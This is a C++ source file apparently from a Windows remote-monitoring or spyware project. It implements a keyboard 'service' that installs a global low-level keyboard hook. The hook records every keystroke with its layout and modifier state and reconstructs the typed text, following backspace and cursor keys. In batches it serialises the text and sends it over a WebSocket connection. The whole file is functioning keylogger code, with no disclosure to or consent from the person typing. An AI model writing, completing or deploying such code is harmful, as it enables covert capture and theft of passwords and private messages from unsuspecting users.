#include "services.hpp"

#if SERVICE_KEYBOARD_ENABLED

#include "tools.hpp"
#include "winfx.hpp"
#include "lrcdatawriter.hpp"
#include <thread>
#include <mutex>
#include <list>
#include <queue>
#include <string>
#include <sstream>
#include <fstream>

using namespace Services;
using namespace lrcdata;

namespace
{
	bool isRunning = false;

	typedef std::list<PartKeyboard> PKList;
	typedef std::queue<PartKeyboard> PKQueue;

	std::thread vkQueueThread;
	std::mutex vkQueueMutex;

	size_t vkEvents;
	size_t vkRepeats;
	size_t vkListCursorBegin;
	size_t vkListCursor;
	PKList vkList;
	PKQueue vkQueue;
	VKInfo lastKeyPressed;

	//HWND lastForegroundWindow = NULL;

	HHOOK hhkLowLevelKybd = NULL;
	HWINEVENTHOOK g_hook = NULL;

	void CALLBACK HandleWinEvent(HWINEVENTHOOK hook, DWORD event, HWND hwnd,
		LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime)
	{
		WNDInfo wndInfo = tools::GetWNDInfo(hwnd);
	}

	// Low level keyboard callback function
	LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
	{
		if (wParam == WM_KEYDOWN)
		{
			KBDLLHOOKSTRUCT* dllHookStruct = (KBDLLHOOKSTRUCT*)lParam;

			bool isShift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
			bool isCapsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

			PartKeyboard pk;
			pk.subtype = LRCDATA_KEYBOARD_SUBTYPE_VKINFO;
			pk.vkInfo.keyCode = dllHookStruct->vkCode;
			pk.vkInfo.lang = WORD(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL)));
			pk.vkInfo.flags = isShift && isCapsLock ? 0x3 : isShift ? 0x1 : isCapsLock ? 0x2 : 0x0;

			vkQueueMutex.lock();
			vkQueue.push(pk);
			vkQueueMutex.unlock();
		}

		return CallNextHookEx(hhkLowLevelKybd, nCode, wParam, lParam);
	}

	// Copmares two VirtualKeyInfo structures
	inline bool vkcmp(const VKInfo vk1, const VKInfo vk2)
	{
		return (vk1.keyCode == vk2.keyCode && vk1.lang == vk2.lang && vk1.flags == vk2.flags);
	}

	// Is virtual key appends text into text fields
	inline bool isprintable(const DWORD vkCode)
	{
		return (vkCode == 0x20)						// Spacebar
			|| (vkCode >= 0x30 && vkCode <= 0x5A)	// 0 - 9, A - Z
			|| (vkCode >= 0x60 && vkCode <= 0x6F)	// Numpad keys
			|| (vkCode >= 0xBA && vkCode <= 0xE2);	// Different signs ([]'\;/.`)
	}

	// Saves vkList
	void save()
	{
		std::string debug;

		for (PKList::iterator it = vkList.begin(); it != vkList.end(); ++it)
		{
			debug += it->vkInfo.keyCode;
		}

		LRCDataWriter writer("fe6340be87fd5e43b7f0cac5741e76205dd69a68b2024fda16c696848a720f7a");
		ByteVector result = writer.GetBytes(vkList);
		if (WebSocket::IsRunning())
		{
			WebSocket::Send(result);
		}

		// Prepare buffer to next virtual-key sequence
		vkListCursorBegin = 0;
		vkListCursor = 0;
		vkEvents = 0;
		vkList.clear();
	}

	void onDelete()
	{
		if (vkListCursor < vkList.size())
		{
			PKList::iterator it = vkList.begin();
			std::advance(it, vkListCursor);
			vkList.erase(it);
			vkEvents--;
		}
	}

	void onBackspace()
	{
		if (vkListCursor > vkListCursorBegin)
		{
			PKList::iterator it = vkList.begin();
			std::advance(it, vkListCursor - 1);
			vkList.erase(it);
			vkEvents--;
			vkListCursor--;
		}
	}

	// Initial assignment
	void clear()
	{
		vkEvents = 0;
		vkRepeats = 0;
		vkListCursorBegin = 0;
		vkListCursor = 0;
		lastKeyPressed.keyCode = 0;
		lastKeyPressed.lang = 0;
		lastKeyPressed.flags = 0;
		vkList.clear();
	}

	void processvk(VKInfo vkInfo)
	{
		// Filter virtual-key repeats
		if (vkcmp(vkInfo, lastKeyPressed))
		{
			if (vkRepeats != KBD_MAX_REPEATS)
			{
				vkRepeats++;
			}
			else
			{
				return;
			}
		}
		else
		{
			vkRepeats = 0;
			lastKeyPressed = vkInfo;
		}

		if (isprintable(vkInfo.keyCode))
		{
			PartKeyboard toAdd;
			toAdd.subtype = 0x1;
			toAdd.vkInfo = vkInfo;

			if (vkListCursor > vkList.size())
			{
				vkList.push_back(toAdd);
			}
			else
			{
				// Insert virtual-key into vkList at cursor position
				PKList::iterator it = vkList.begin();
				std::advance(it, vkListCursor);
				vkList.insert(it, toAdd);
			}
			
			vkListCursor++;
			vkEvents++;

			if (vkEvents == KBD_KEYS_TO_SAVE)
			{
				save();
			}
		}
		else
		{
			vkListCursor = vkListCursorBegin = vkList.size();
		}
	}

	// Function with loop which processes new keystrokes in queue
	void processqueue()
	{
		while (isRunning)
		{
			if (!vkQueue.empty())
			{
				vkQueueMutex.lock();
				VKInfo vkInfo = vkQueue.front().vkInfo;
				vkQueue.pop();
				vkQueueMutex.unlock();

				switch (vkInfo.keyCode)
				{
				case VK_BACK:
					onBackspace();
					break;
				case VK_DELETE:
					onDelete();
					break;
				case VK_UP:
					// Point cursor to the start
					vkListCursor = vkListCursorBegin;
					break;
				case VK_DOWN:
					// Point cursor to the end
					vkListCursor = vkList.size();
					break;
				case VK_LEFT:
					// Shift virtual-key cursor to left if cursor isn't at begining
					if (vkListCursor > vkListCursorBegin)
					{
						vkListCursor--;
					}
					break;
				case VK_RIGHT:
					// Shift virtual-key cursor to right if cursor isn't at end
					if (vkListCursor < vkList.size())
					{
						vkListCursor++;
					}
					break;
				default:
					if (vkInfo.keyCode != 0)
					{
						processvk(vkInfo);
					}
					break;
				}
			}
			Sleep(50);
		}
	}
}

void Keyboard::Run()
{
	// Exit function if service is already running
	if (isRunning)
	{
		return;
	}

	isRunning = true;
	clear();

	if (hhkLowLevelKybd == NULL)
	{
		hhkLowLevelKybd = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, NULL);
	}

	if (g_hook == NULL)
	{
		g_hook = SetWinEventHook(
			EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL,
			HandleWinEvent, 0, 0, WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
	}

	vkQueueThread = std::thread(processqueue);
}

void Keyboard::Stop()
{
	if (!isRunning)
	{
		return;
	}

	isRunning = false;
	vkQueueThread.join();

	if (hhkLowLevelKybd != NULL)
	{
		UnhookWindowsHookEx(hhkLowLevelKybd);
		hhkLowLevelKybd = NULL;
	}

	if (g_hook != NULL)
	{
		UnhookWinEvent(g_hook);
	}
}

bool Keyboard::IsRunning()
{
	return isRunning;
}

#endif // SERVICE_KEYBOARD_ENABLED